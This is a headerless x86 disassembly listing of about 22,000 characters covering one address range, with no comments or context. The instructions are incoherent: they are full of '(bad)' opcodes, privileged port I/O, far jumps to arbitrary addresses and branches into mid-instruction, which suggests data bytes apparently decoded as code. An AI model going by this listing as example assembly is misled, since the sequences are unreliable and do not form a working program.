  43a203:	xchg   esp,eax
  43a204:	ins    BYTE PTR es:[edi],dx
  43a205:	mov    dh,0x2d
  43a207:	adc    eax,0x7234b586
  43a20c:	and    edi,DWORD PTR [ebp+0x59]
  43a20f:	pop    ebx
  43a210:	mov    bh,0xb5
  43a212:	in     eax,dx
  43a213:	jo     0x43a1d2
  43a215:	loopne 0x43a19d
  43a217:	sub    DWORD PTR [ecx+0x233a35ac],ecx
  43a21d:	mov    dh,0x1
  43a21f:	jno    0x43a1ac
  43a221:	ins    DWORD PTR es:[edi],dx
  43a222:	inc    ecx
  43a223:	xor    ecx,DWORD PTR [ebp-0x5f]
  43a226:	mov    ah,0x27
  43a228:	mov    dh,0x23
  43a22a:	fdiv   DWORD PTR [esi+0x7f]
  43a22d:	int3   
  43a22e:	pop    edi
  43a22f:	gs pop ebx
  43a231:	les    esp,FWORD PTR [eax+0x476a7d53]
  43a237:	inc    eax
  43a238:	retf   
  43a239:	dec    edi
  43a23a:	dec    ebx
  43a23b:	cdq    
  43a23c:	nop
  43a23d:	pop    ebx
  43a23e:	mov    dl,0xdd
  43a240:	fimul  DWORD PTR [esi+0x47c3582e]
  43a246:	sub    DWORD PTR [eax-0x75],eax
  43a249:	lods   eax,DWORD PTR ds:[esi]
  43a24a:	ja     0x43a227
  43a24c:	mov    dh,0x39
  43a24e:	mov    dh,0x1d
  43a250:	je     0x43a28b
  43a252:	mov    edi,0x6b602998
  43a257:	push   0x87daa36d
  43a25c:	lahf   
  43a25d:	icebp  
  43a25e:	pop    eax
  43a25f:	(bad)  
  43a260:	sbb    eax,0xdd05df6c
  43a265:	retf   0xb9b2
  43a268:	sti    
  43a269:	or     edx,DWORD PTR [edi]
  43a26b:	ret    
  43a26c:	iret   
  43a26d:	or     BYTE PTR [edi],ah
  43a26f:	pop    ebp
  43a270:	add    ch,BYTE PTR [esi+0x74]
  43a273:	add    ch,ah
  43a275:	push   cs
  43a276:	(bad)  [edx-0x4893ea3f]
  43a27c:	sbb    ah,BYTE PTR [eax+0x2b]
  43a27f:	test   ebp,edx
  43a281:	cs push 0x2db6e8f6
  43a287:	jne    0x43a2ea
  43a289:	jmp    0xa25e99e4
  43a28e:	inc    edi
  43a28f:	pop    eax
  43a290:	pop    es
  43a291:	or     bh,al
  43a293:	mov    ah,0xa3
  43a295:	inc    esi
  43a296:	fs je  0x43a2a1
  43a299:	jb     0x43a30f
  43a29b:	and    al,BYTE PTR [eax+0x4dee6c0f]
  43a2a1:	gs pusha 
  43a2a3:	js     0x43a243
  43a2a5:	push   0x2a6b6163
  43a2aa:	loop   0x43a27d
  43a2ac:	fnstenv [edi]
  43a2ae:	xlat   BYTE PTR ds:[ebx]
  43a2af:	and    bp,ax
  43a2b2:	lods   eax,DWORD PTR ds:[esi]
  43a2b3:	add    esi,DWORD PTR [esi]
  43a2b5:	inc    eax
  43a2b6:	dec    eax
  43a2b7:	jb     0x43a2d8
  43a2b9:	add    eax,0xa0291cc6
  43a2be:	ins    DWORD PTR es:[edi],dx
  43a2bf:	pop    es
  43a2c0:	mov    ah,0xbc
  43a2c2:	xchg   esi,eax
  43a2c3:	pop    esp
  43a2c4:	xchg   esp,eax
  43a2c5:	pop    esp
  43a2c6:	mov    ds:0xa4b6f2db,al
  43a2cb:	call   FWORD PTR [edx]
  43a2cd:	add    al,0x0
  43a2cf:	xor    ah,BYTE PTR [ebp-0x35]
  43a2d2:	pop    es
  43a2d3:	in     eax,0xd
  43a2d5:	pop    eax
  43a2d6:	push   0x16b1c2a
  43a2db:	adc    ebx,ebx
  43a2dd:	push   esi
  43a2de:	loopne 0x43a30a
  43a2e0:	ins    BYTE PTR es:[edi],dx
  43a2e1:	xlat   BYTE PTR ds:[ebx]
  43a2e3:	jbe    0x43a2cc
  43a2e5:	mov    al,0x28
  43a2e7:	loop   0x43a2bb
  43a2e9:	(bad)  
  43a2ea:	aas    
  43a2eb:	retf   0x4d26
  43a2ee:	jle    0x43a278
  43a2f0:	ins    DWORD PTR es:[edi],dx
  43a2f1:	pop    ebx
  43a2f2:	stos   BYTE PTR es:[edi],al
  43a2f3:	sbb    dh,BYTE PTR [ebp+ebx*2+0x1d6b61c3]
  43a2fa:	(bad)  
  43a2fb:	mov    dh,0xad
  43a2fd:	or     esp,DWORD PTR [edx+0x5c690d9a]
  43a303:	addr16 es dec eax
  43a306:	push   0xffffff89
  43a308:	pusha  
  43a309:	fcmovnu st,st(5)
  43a30b:	pop    eax
  43a30c:	retf   
  43a30d:	scas   eax,DWORD PTR es:[edi]
  43a30e:	stos   DWORD PTR es:[edi],eax
  43a30f:	(bad)  
  43a311:	fld    TBYTE PTR [ebp+0x5f198529]
  43a317:	and    BYTE PTR ds:0x6edcad53,0x1d
  43a31e:	push   eax
  43a31f:	aaa    
  43a320:	dec    ebx
  43a321:	sbb    ah,BYTE PTR [esi+0x37dd3563]
  43a327:	pop    ebx
  43a328:	retf   
  43a329:	lods   eax,DWORD PTR ds:[esi]
  43a32a:	stos   DWORD PTR es:[edi],eax
  43a32b:	mov    al,ds:0x175f27d6
  43a330:	iret   
  43a331:	clc    
  43a332:	dec    ebx
  43a333:	dec    ebx
  43a334:	rol    DWORD PTR [edi],1
  43a336:	jp     0x43a38a
  43a338:	sub    ah,0xd4
  43a33b:	int3   
  43a33c:	mov    al,ds:0x452d6da3
  43a341:	sbb    al,0x1e
  43a343:	mov    DWORD PTR [edi],esp
  43a345:	jo     0x43a38e
  43a347:	push   esp
  43a348:	ins    DWORD PTR es:[edi],dx
  43a349:	fwait
  43a34a:	into   
  43a34b:	out    0x79,eax
  43a34d:	enter  0x4d8c,0x6d
  43a351:	jmp    0x43a2db
  43a353:	push   0x74
  43a355:	sub    ebx,DWORD PTR [ebx]
  43a357:	add    ah,BYTE PTR [ebp-0x30]
  43a35a:	dec    edx
  43a35b:	mov    cl,BYTE PTR [ebx]
  43a35d:	sub    eax,0xfa4188aa
  43a362:	sbb    eax,0xd11d1b65
  43a367:	push   cs
  43a368:	push   ecx
  43a369:	and    cl,BYTE PTR [ecx-0x7e7b7252]
  43a36f:	mov    gs,WORD PTR [edx-0xa35f4d2]
  43a375:	jmp    0x2ba40858
  43a37a:	retf   
  43a37b:	(bad)  
  43a37c:	mov    cl,0x8c
  43a37e:	mov    edi,DWORD PTR [eax+0x71]
  43a381:	mov    eax,ds:0x36daa006
  43a387:	adc    eax,0x7a5fe042
  43a38c:	add    dl,bl
  43a38e:	add    eax,eax
  43a390:	xchg   edx,eax
  43a391:	rcl    DWORD PTR [edx+0x36d9ef8e],cl
  43a397:	mov    ds:0x6c9e4c86,al
  43a39c:	mov    al,ds:0xdadb60b
  43a3a1:	pop    edx
  43a3a2:	inc    eax
  43a3a3:	mov    edx,0x16be7a77
  43a3a8:	push   esp
  43a3a9:	inc    ebx
  43a3aa:	les    esi,FWORD PTR [esi-0x54]
  43a3ad:	outs   dx,BYTE PTR es:[esi]
  43a3af:	push   ss
  43a3b0:	mov    al,ds:0xed8da20d
  43a3b5:	data16 jno 0x43a3da
  43a3b8:	and    dh,BYTE PTR [esi]
  43a3ba:	mov    dh,0xba
  43a3bc:	mov    edi,0x451b64da
  43a3c1:	mov    ds:0x356cba8a,al
  43a3c6:	std    
  43a3c7:	jl     0x43a3e3
  43a3c9:	and    esi,DWORD PTR [edi]
  43a3cb:	sbb    ecx,DWORD PTR [ebp+0x75]
  43a3ce:	jmp    0x43a375
  43a3d0:	in     al,0xfe
  43a3d2:	(bad)  
  43a3d3:	jnp    0x43a367
  43a3d5:	pop    es
  43a3d6:	sub    eax,0xb61617b6
  43a3db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43a3dc:	dec    esi
  43a3dd:	add    bl,BYTE PTR [ecx+0x6ac9702]
  43a3e3:	fs jnp 0x43a381
  43a3e6:	jbe    0x43a449
  43a3e8:	arpl   WORD PTR [ebx+0x3b],bp
  43a3eb:	or     BYTE PTR [ecx],0xf9
  43a3ee:	jno    0x43a3b1
  43a3f0:	xlat   BYTE PTR ds:[ebx]
  43a3f1:	jmp    0x43a452
  43a3f3:	retf   
  43a3f4:	add    eax,0x9decb6b6
  43a3f9:	scas   eax,DWORD PTR es:[edi]
  43a3fa:	outs   dx,DWORD PTR ds:[esi]
  43a3fb:	sub    esp,0x6c0569d5
  43a401:	pop    ss
  43a402:	or     ch,BYTE PTR [ecx+0x44bcebf4]
  43a408:	pop    eax
  43a409:	sub    BYTE PTR [edx+0x5269076d],0xc9
  43a410:	pop    DWORD PTR [eax]
  43a412:	sbb    BYTE PTR [ebx],0x5
  43a415:	jmp    0xc027:0xf3d1da75
  43a41c:	je     0x43a479
  43a41e:	push   0xffffffaa
  43a420:	push   0x56
  43a422:	pop    edi
  43a423:	cwde   
  43a424:	into   
  43a425:	out    dx,eax
  43a426:	mov    eax,0x4db42ff2
  43a42b:	(bad)  
  43a42d:	ror    BYTE PTR [eax+ebp*8+0x29004753],1
  43a434:	xchg   ecx,eax
  43a435:	add    BYTE PTR [esi],dl
  43a437:	adc    BYTE PTR [ebx],bl
  43a439:	mov    ds:0x45ea7fea,al
  43a43e:	bound  esp,QWORD PTR [ecx]
  43a440:	add    ecx,DWORD PTR [edx+0x1249342e]
  43a446:	dec    esp
  43a447:	adc    eax,0x11da0415
  43a44c:	je     0x43a3ef
  43a44e:	push   0x28
  43a450:	sbb    BYTE PTR [ecx-0x75393501],0x68
  43a457:	mov    ds:0xa585f909,eax
  43a45c:	(bad)  
  43a45e:	fild   DWORD PTR [edi-0x5a]
  43a461:	sbb    DWORD PTR [eax+0x1c3d8380],esp
  43a467:	ins    DWORD PTR es:[edi],dx
  43a468:	pop    ss
  43a469:	adc    DWORD PTR [edi],edx
  43a46b:	adc    esi,DWORD PTR ds:0xf22daac8
  43a471:	add    eax,0x6e280ec1
  43a476:	xor    eax,0x854154b2
  43a47b:	sahf   
  43a47c:	mov    DWORD PTR [edx],ecx
  43a47e:	xlat   BYTE PTR ds:[ebx]
  43a47f:	adc    eax,0x8fbfc30d
  43a484:	adc    ch,bl
  43a486:	mov    dh,0xed
  43a488:	bsf    edi,DWORD PTR [ebx]
  43a48b:	es xor al,0x41
  43a48e:	psrld  mm0,mm4
  43a491:	mov    fs,WORD PTR [eax]
  43a493:	fcmove st,st(5)
  43a495:	hlt    
  43a496:	arpl   WORD PTR [ebp+0x69],bp
  43a499:	daa    
  43a49a:	stos   DWORD PTR es:[edi],eax
  43a49b:	add    dh,BYTE PTR [esi]
  43a49d:	inc    ecx
  43a49e:	out    0x49,eax
  43a4a0:	sub    BYTE PTR [edi+0x59],0xb6
  43a4a4:	test   DWORD PTR [edx+0x2fd6605],esp
  43a4aa:	(bad)  
  43a4ab:	cmp    eax,0x65a2ae88
  43a4b0:	jns    0x43a50c
  43a4b2:	out    0x2a,al
  43a4b4:	sub    cl,BYTE PTR [edx-0xf7d7c93]
  43a4ba:	add    eax,0xb1b15580
  43a4bf:	in     eax,dx
  43a4c0:	hlt    
  43a4c1:	sbb    DWORD PTR [eax],esi
  43a4c3:	aam    0xb2
  43a4c5:	fcmovne st,st(6)
  43a4c7:	push   eax
  43a4c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43a4c9:	push   0xffffffdb
  43a4cb:	ins    BYTE PTR es:[edi],dx
  43a4cc:	dec    eax
  43a4cd:	popf   
  43a4ce:	inc    edi
  43a4cf:	gs jb  0x43a4ec
  43a4d2:	mov    ds:0x225d2dba,al
  43a4d7:	fwait
  43a4d8:	or     eax,0x6e9b1c70
  43a4dd:	xor    al,0x68
  43a4df:	fistp  DWORD PTR [ecx+0x5a]
  43a4e2:	inc    esp
  43a4e3:	stos   BYTE PTR es:[edi],al
  43a4e4:	add    DWORD PTR [edx],ebp
  43a4e6:	jno    0x43a480
  43a4e8:	adc    al,dl
  43a4ea:	xchg   BYTE PTR [eax-0x227321bc],ah
  43a4f0:	ficom  DWORD PTR [edx-0x29]
  43a4f3:	cli    
  43a4f4:	xchg   edi,eax
  43a4f5:	das    
  43a4f6:	add    cl,BYTE PTR [edx+0x19]
  43a4f9:	sti    
  43a4fa:	into   
  43a4fb:	call   DWORD PTR [edx+0x557637c]
  43a501:	push   0xffffffdb
  43a503:	mov    esi,DWORD PTR [esi]
  43a505:	push   ss
  43a506:	add    BYTE PTR [edx-0x3aaecbe1],cl
  43a50c:	mov    dh,0xbd
  43a50e:	mov    eax,ds:0xb6598f39
  43a513:	add    DWORD PTR [edx],0x2e
  43a516:	inc    eax
  43a517:	jo     0x43a4c8
  43a519:	jmp    0x696a:0x14712489
  43a520:	cmp    DWORD PTR [ebp-0x5d],0x2f
  43a524:	retf   
  43a525:	ins    DWORD PTR es:[edi],dx
  43a526:	sub    al,0xcb
  43a528:	mov    bh,0x6e
  43a52a:	xor    ah,al
  43a52c:	repz dec esp
  43a52e:	jmp    0xad0d8133
  43a533:	mov    ebx,0x1135baaa
  43a538:	fsubr  st,st(4)
  43a53a:	es in  eax,0x60
  43a53d:	ins    DWORD PTR es:[edi],dx
  43a53e:	mov    bh,0x76
  43a540:	imul   ecx,DWORD PTR [eax],0x7d
  43a543:	xlat   BYTE PTR ds:[ebx]
  43a544:	push   ecx
  43a545:	cmp    al,0x53
  43a547:	mov    al,0x39
  43a549:	sar    eax,cl
  43a54b:	jle    0x43a5c3
  43a54d:	push   ecx
  43a54e:	jno    0x43a4f3
  43a550:	push   0x4961f5d2
  43a555:	(bad)  
  43a556:	ins    BYTE PTR es:[edi],dx
  43a557:	xor    DWORD PTR [esi-0x5bb4ff93],0x8c44237a
  43a561:	outs   dx,DWORD PTR ds:[esi]
  43a562:	mov    dh,0x6d
  43a564:	fild   DWORD PTR [esi+0x5c0852cc]
  43a56a:	adc    al,0x77
  43a56c:	mov    bl,0x48
  43a56e:	jge    0x43a527
  43a570:	push   0xbc03d14b
  43a575:	push   ecx
  43a576:	enter  0xcd6f,0xfb
  43a57a:	mov    ebx,0x3b5011d5
  43a57f:	xlat   BYTE PTR ds:[ebx]
  43a580:	adc    BYTE PTR [ebx+0x69],dl
  43a583:	xchg   edx,eax
  43a584:	les    ecx,FWORD PTR [esi+0x1a7d6da2]
  43a58a:	xor    bl,dl
  43a58c:	dec    eax
  43a58d:	cmp    DWORD PTR [ebx],ebx
  43a58f:	stos   BYTE PTR es:[edi],al
  43a590:	fadd   DWORD PTR [eax+edi*2+0x53]
  43a594:	jecxz  0x43a602
  43a596:	dec    eax
  43a597:	push   ebx
  43a598:	add    DWORD PTR [edx],eax
  43a59a:	jbe    0x43a5ad
  43a59c:	add    al,0x5b
  43a59e:	cmp    eax,esi
  43a5a0:	adc    DWORD PTR [ebp+0x14],edi
  43a5a3:	mov    al,0x60
  43a5a5:	loop   0x43a5eb
  43a5a7:	dec    ecx
  43a5a8:	mov    dh,0xab
  43a5aa:	pusha  
  43a5ab:	pop    es
  43a5ac:	loope  0x43a625
  43a5ae:	pusha  
  43a5af:	ins    DWORD PTR es:[edi],dx
  43a5b0:	outs   dx,DWORD PTR ds:[esi]
  43a5b1:	jnp    0x43a599
  43a5b3:	pop    ebx
  43a5b4:	push   ebx
  43a5b5:	shl    BYTE PTR [ebp-0x61999820],1
  43a5bb:	pop    edi
  43a5bc:	ja     0x43a611
  43a5be:	mov    bh,0x8d
  43a5c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43a5c1:	mov    al,ds:0x184ba49f
  43a5c6:	dec    edi
  43a5c7:	jno    0x43a60c
  43a5c9:	lods   eax,DWORD PTR ds:[esi]
  43a5ca:	or     DWORD PTR [eax+0x4743500d],ecx
  43a5d0:	mov    eax,0xad8a5056
  43a5d5:	mov    al,0xc2
  43a5d7:	push   ebp
  43a5d8:	push   0xffffffd1
  43a5da:	jmp    0x87e82d6
  43a5df:	mov    eax,0x7235e782
  43a5e4:	fst    QWORD PTR [eax-0x27]
  43a5e7:	xor    BYTE PTR [eax+0x4e05436d],ch
  43a5ed:	sar    DWORD PTR [esi],1
  43a5ef:	cmp    DWORD PTR [edi],0x34
  43a5f2:	adc    al,0xb0
  43a5f4:	mov    DWORD PTR [ecx+0xb27c6d2],edi
  43a5fa:	or     ch,BYTE PTR [esi+0x4b]
  43a5fd:	or     esp,DWORD PTR [ecx]
  43a5ff:	cmp    al,0x9b
  43a601:	xor    edi,ebp
  43a603:	sub    dh,bh
  43a605:	test   DWORD PTR [esi-0x57],esi
  43a608:	stos   DWORD PTR es:[edi],eax
  43a609:	loop   0x43a58b
  43a60b:	lods   eax,DWORD PTR ds:[esi]
  43a60c:	mov    eax,0x445ba793
  43a611:	je     0x43a5ee
  43a613:	fisub  DWORD PTR [ebx+esi*4]
  43a616:	into   
  43a617:	dec    edx
  43a618:	adc    eax,edi
  43a61a:	adc    al,bl
  43a61c:	call   0x3f60c137
  43a621:	or     BYTE PTR [ebx+0x5],cl
  43a624:	push   esp
  43a625:	add    DWORD PTR [eax],ebp
  43a627:	push   ebp
  43a628:	mov    bh,0xad
  43a62a:	mov    eax,ds:0x42641ec
  43a62f:	pop    edi
  43a630:	rol    BYTE PTR [ecx],0xa1
  43a633:	mov    ebx,eax
  43a635:	push   eax
  43a636:	fs push edx
  43a638:	add    cl,0xfd
  43a63b:	add    al,0x8
  43a63d:	mov    dh,0x1d
  43a63f:	jo     0x43a611
  43a641:	imul   edi,DWORD PTR [ebp-0x6fca169a],0xffffff80
  43a648:	push   ss
  43a649:	sub    BYTE PTR [edx],bl
  43a64b:	jno    0x43a6b3
  43a64d:	mov    al,ds:0xb4576060
  43a652:	in     eax,dx
  43a653:	std    
  43a654:	jp     0x43a62f
  43a656:	add    ch,BYTE PTR [ebp-0x23d5a293]
  43a65c:	pop    edx
  43a65d:	push   0x8
  43a65f:	cmp    BYTE PTR [esi-0x6aaa7b11],dh
  43a665:	scas   al,BYTE PTR es:[edi]
  43a666:	mov    ebx,0xc14136d1
  43a66b:	push   eax
  43a66c:	daa    
  43a66d:	mov    edi,0xd4bf460f
  43a672:	sub    DWORD PTR [eax-0x5aaca492],ecx
  43a678:	pop    esp
  43a679:	inc    ecx
  43a67a:	mov    dl,0xde
  43a67c:	sbb    ebx,DWORD PTR [edi]
  43a67e:	fsubr  QWORD PTR [eax+0x9f23707]
  43a684:	inc    ecx
  43a685:	out    0xff,al
  43a687:	out    dx,al
  43a688:	popa   
  43a689:	imul   eax,DWORD PTR [edx-0x21f93e78],0x5
  43a690:	arpl   WORD PTR [eax],bp
  43a692:	fadd   DWORD PTR [ecx-0x49]
  43a695:	jbe    0x43a6c0
  43a697:	jecxz  0x43a6ce
  43a699:	repnz lods al,BYTE PTR ds:[esi]
  43a69b:	dec    ebx
  43a69c:	loop   0x43a682
  43a69e:	out    0x75,eax
  43a6a0:	push   esp
  43a6a1:	mov    cl,0x2b
  43a6a3:	sbb    BYTE PTR [edx-0x14],0x2c
  43a6a7:	mov    edx,0xb2c2ed50
  43a6ac:	cmp    DWORD PTR [edi],0xffffff86
  43a6af:	retf   0xabe3
  43a6b2:	cmc    
  43a6b3:	jle    0x43a729
  43a6b5:	fisttp DWORD PTR [edx]
  43a6b7:	les    edi,FWORD PTR [ebp+edx*1+0x2bf1c6d4]
  43a6be:	das    
  43a6bf:	dec    sp
  43a6c1:	sub    al,0x6c
  43a6c3:	aam    0xb6
  43a6c5:	mov    ebx,0x707879a8
  43a6ca:	(bad)  
  43a6cb:	test   DWORD PTR [ebp+0x2fc965dd],ebp
  43a6d1:	push   esi
  43a6d2:	outs   dx,BYTE PTR ds:[esi]
  43a6d3:	cmp    DWORD PTR ds:0xba254342,0x508a0362
  43a6dd:	mov    ecx,0x7602b3f3
  43a6e2:	adc    eax,0x34b7d1dd
  43a6e7:	add    eax,0x742e4656
  43a6ec:	lds    ebp,FWORD PTR [esi-0x48650101]
  43a6f2:	cs adc edx,ecx
  43a6f5:	test   BYTE PTR [esi-0x1677fc4a],dh
  43a6fb:	idiv   DWORD PTR [esi-0x6e]
  43a6fe:	adc    al,0x4c
  43a700:	or     eax,DWORD PTR [eax+0xec90a36]
  43a706:	jecxz  0x43a748
  43a708:	push   edi
  43a709:	aad    0xad
  43a70b:	es cwde 
  43a70d:	or     al,0xa7
  43a70f:	mov    BYTE PTR [eax+0x4b405d1b],cl
  43a715:	std    
  43a716:	push   eax
  43a717:	aam    0x45
  43a719:	repz adc DWORD PTR [bx+di],eax
  43a71d:	fwait
  43a71e:	mov    ds:0x5e5ad47a,al
  43a723:	mov    dh,0xa3
  43a725:	pop    edx
  43a726:	fcomp  DWORD PTR [edi]
  43a728:	mov    al,0xe6
  43a72a:	shr    esp,cl
  43a72c:	popa   
  43a72d:	(bad)  
  43a72e:	(bad)  
  43a72f:	sbb    eax,0xd051da22
  43a734:	push   ecx
  43a735:	pop    ebx
  43a736:	mov    ds:0x88505209,al
  43a73b:	call   0x3a16:0x4b61a658
  43a742:	inc    edi
  43a743:	aad    0xca
  43a745:	and    al,0x53
  43a747:	jle    0x43a6e3
  43a749:	call   0x368b:0x17001308
  43a750:	hlt    
  43a751:	and    eax,0x974554d
  43a756:	add    bh,dl
  43a758:	adc    eax,0xb6ede5f0
  43a75d:	mov    ah,0x6d
  43a75f:	and    BYTE PTR [ebp+0x17],bl
  43a762:	add    DWORD PTR [edx-0x28],ecx
  43a765:	ret    0xa632
  43a768:	sbb    eax,0x45b6d388
  43a76d:	enter  0xe074,0x68
  43a771:	inc    ecx
  43a772:	inc    esi
  43a773:	mov    eax,0x953296b6
  43a778:	mov    ds:0xe00ec4a4,eax
  43a77d:	mov    dh,0x50
  43a77f:	mov    BYTE PTR [edi+ebx*8],ah
  43a782:	cmp    ebp,esp
  43a784:	jmp    0x43a7dd
  43a786:	push   esp
  43a787:	mov    cl,0x6d
  43a789:	stos   BYTE PTR es:[edi],al
  43a78a:	fdivr  DWORD PTR [esp+ebx*1+0x1b414fb6]
  43a791:	stos   BYTE PTR es:[edi],al
  43a792:	fimul  DWORD PTR ds:0x6bda25e1
  43a798:	pop    ecx
  43a799:	adc    al,0x74
  43a79b:	mov    DWORD PTR [eax],esi
  43a79d:	(bad)  
  43a79f:	dec    edi
  43a7a0:	test   BYTE PTR [edx+0x59d5168d],0x2f
  43a7a7:	in     al,0x42
  43a7a9:	cld    
  43a7aa:	sbb    ecx,DWORD PTR [edx-0x1f4527a6]
  43a7b0:	dec    ecx
  43a7b1:	shr    BYTE PTR [eax+0x6c2ed1e8],0x34
  43a7b8:	push   ebp
  43a7b9:	mov    bh,0x9e
  43a7bb:	nop
  43a7bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43a7bd:	or     eax,0x8ba2211e
  43a7c2:	loopne 0x43a79a
  43a7c4:	push   0x6ed85932
  43a7c9:	jmp    0xab3c:0x14006db6
  43a7d0:	pavgw  mm1,QWORD PTR ds:0x576d96fe
  43a7d7:	shl    bh,0x84
  43a7da:	ds mov dl,0xb
  43a7dd:	mov    ebp,0xb4428584
  43a7e2:	push   eax
  43a7e3:	adc    esi,DWORD PTR [esi-0x27]
  43a7e6:	jl     0x43a856
  43a7e8:	pop    ebp
  43a7e9:	adc    ebx,ebx
  43a7eb:	xchg   esi,eax
  43a7ec:	pop    edi
  43a7ed:	pop    ecx
  43a7ee:	inc    ebx
  43a7ef:	das    
  43a7f0:	repz and esi,DWORD PTR [ebp+0x6899b3e]
  43a7f7:	mov    ds:0xb32859a9,al
  43a7fc:	jo     0x43a802
  43a7fe:	mov    cl,0xa1
  43a800:	outs   dx,BYTE PTR ds:[esi]
  43a801:	and    esi,DWORD PTR [edx+0x68]
  43a804:	cli    
  43a805:	adc    BYTE PTR [ebp+0x75a9b500],ch
  43a80b:	mov    esp,0x18dfb646
  43a810:	rsm    
  43a812:	(bad)  [esi+0x5b049dd0]
  43a818:	and    BYTE PTR [eax-0x30],ch
  43a81b:	lods   eax,DWORD PTR ds:[esi]
  43a81c:	fidivr DWORD PTR [edi]
  43a81e:	add    DWORD PTR ss:[ebp-0x7e],ebp
  43a822:	dec    ebp
  43a823:	mov    bh,0xe7
  43a825:	loope  0x43a7aa
  43a827:	scas   eax,DWORD PTR es:[edi]
  43a828:	outs   dx,BYTE PTR ds:[esi]
  43a829:	adc    al,0xb9
  43a82b:	mov    ds:0x1d4cf1fc,al
  43a830:	and    BYTE PTR [edx+0x1f23d0b5],bh
  43a836:	popf   
  43a837:	xor    DWORD PTR [edx],eax
  43a839:	ss fcmovnb st,st(6)
  43a83c:	jb     0x43a8a9
  43a83e:	aad    0x7a
  43a840:	repnz ins BYTE PTR es:[edi],dx
  43a842:	in     eax,dx
  43a843:	mov    cl,0xf
  43a845:	inc    edx
  43a846:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43a847:	inc    edi
  43a848:	aam    0xa5
  43a84a:	adc    BYTE PTR [edi],0xf0
  43a84d:	or     esp,0xffffffc0
  43a850:	add    DWORD PTR [ebx-0x3064e260],ebx
  43a856:	test   DWORD PTR [edi-0x47a02d26],esi
  43a85c:	rol    DWORD PTR [esi+edi*4],1
  43a85f:	cdq    
  43a860:	jnp    0x43a840
  43a862:	pop    ds
  43a863:	popa   
  43a864:	cli    
  43a865:	add    BYTE PTR [ebp+0x61704dc0],dh
  43a86b:	sub    eax,DWORD PTR [edx]
  43a86d:	ret    0x6aa6
  43a870:	int3   
  43a871:	jecxz  0x43a7f6
  43a873:	mov    ah,0xa0
  43a875:	jl     0x43a800
  43a877:	dec    eax
  43a878:	adc    esi,DWORD PTR [esi]
  43a87a:	add    dh,dl
  43a87c:	cmp    al,0x88
  43a87e:	test   DWORD PTR [esi],eax
  43a880:	sub    BYTE PTR [esi],0x5e
  43a883:	pop    ebp
  43a884:	cs pushf 
  43a886:	pop    es
  43a887:	dec    ecx
  43a888:	and    bl,dl
  43a88a:	adc    eax,0x512ed9d1
  43a88f:	jg     0x43a8a3
  43a891:	fiadd  DWORD PTR [eax]
  43a893:	ror    DWORD PTR [esi-0x257bd01a],0x22
  43a89a:	(bad)  
  43a89b:	adc    BYTE PTR ss:[ecx-0x7d48b5f],dh
  43a8a2:	push   ebx
  43a8a3:	es push ebp
  43a8a5:	cs mov ah,0x5b
  43a8a8:	(bad)  [esi]
  43a8aa:	setne  BYTE PTR [edx]
  43a8ad:	mov    al,0x29
  43a8af:	test   DWORD PTR [esi-0x6b],ecx
  43a8b2:	add    al,BYTE PTR [edx-0x20e9da7b]
  43a8b8:	in     eax,0xf4
  43a8ba:	dec    ebx
  43a8bb:	pop    ebx
  43a8bc:	stos   DWORD PTR es:[edi],eax
  43a8bd:	in     eax,0xc8
  43a8bf:	jnp    0x43a8ce
  43a8c1:	push   0xdb11d4e6
  43a8c6:	push   0x3ddda800
  43a8cb:	or     ebx,esi
  43a8cd:	cmp    DWORD PTR [ecx+0x6d8215ba],ecx
  43a8d3:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  43a8d5:	add    edi,DWORD PTR [eax]
  43a8d7:	imul   eax,DWORD PTR [ecx+0x40],0x40
  43a8db:	fnstsw WORD PTR [edx]
  43a8dd:	add    ah,BYTE PTR [ebx+0x12]
  43a8e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43a8e1:	aad    0x2
  43a8e3:	mov    dh,0x26
  43a8e5:	mov    bl,al
  43a8e7:	nop
  43a8e8:	mov    dh,0x70
  43a8ea:	cmp    eax,0xd01e2c19
  43a8ef:	inc    ebp
  43a8f0:	aad    0xd
  43a8f2:	jge    0x43a8c7
  43a8f4:	xor    BYTE PTR [edi+0x5b6d3d7d],al
  43a8fa:	imul   esp,eax,0x39
  43a8fd:	fwait
  43a8fe:	jl     0x43a902
  43a900:	push   ecx
  43a901:	add    bh,BYTE PTR [edx+0x17]
  43a904:	dec    edx
  43a905:	shl    BYTE PTR [esi+0x6a446a0e],0xd9
  43a90c:	test   eax,0xb60824a7
  43a911:	sbb    eax,0x13d22351
  43a916:	xlat   BYTE PTR ds:[ebx]
  43a917:	adc    BYTE PTR [esi+0x34],ch
  43a91a:	aam    0x6
  43a91c:	shl    DWORD PTR [edi],1
  43a91e:	adc    BYTE PTR [eax],ch
  43a920:	push   ss
  43a921:	lock mov ds:0xeb69614,eax
  43a927:	and    dl,dl
  43a929:	mov    DWORD PTR [eax-0x77c58bb2],esi
  43a92f:	mov    edx,0xd7962854
  43a934:	setnp  BYTE PTR [edi]
  43a937:	inc    eax
  43a938:	xchg   edi,eax
  43a939:	cmp    ch,BYTE PTR [edx]
  43a93b:	(bad)  
  43a93c:	sahf   
  43a93d:	cwde   
  43a93e:	(bad)  
  43a93f:	pop    esp
  43a940:	adc    eax,0x596a8aed
  43a945:	lods   al,BYTE PTR ds:[esi]
  43a946:	scas   eax,DWORD PTR es:[edi]
  43a947:	popf   
  43a948:	nop
  43a949:	shl    DWORD PTR [esi],0x28
  43a94c:	jbe    0x43a9c8
  43a94e:	imul   esp,esi,0x31
  43a951:	out    0xf4,al
  43a953:	cs loop 0x43a92c
  43a956:	add    dh,ah
  43a958:	jl     0x43a8e3
  43a95a:	mov    ah,al
  43a95c:	xor    al,0x56
  43a95e:	aad    0x36
  43a960:	mov    al,al
  43a962:	fwait
  43a963:	mov    edi,DWORD PTR [ebx+ecx*8-0x4b95a7d6]
  43a96a:	pop    ss
  43a96b:	mov    eax,ds:0x100dd026
  43a970:	ror    BYTE PTR [esi],0xe2
  43a973:	mov    WORD PTR [ebx+0x55b0cda7],gs
  43a979:	mov    ch,0x6d
  43a97b:	push   esi
  43a97c:	shl    dh,cl
  43a97e:	retf   0xe755
  43a981:	inc    ebp
  43a982:	mov    bh,0x7
  43a984:	add    eax,0xbc22621a
  43a989:	loopne 0x43a9e1
  43a98b:	ficom  DWORD PTR [ecx]
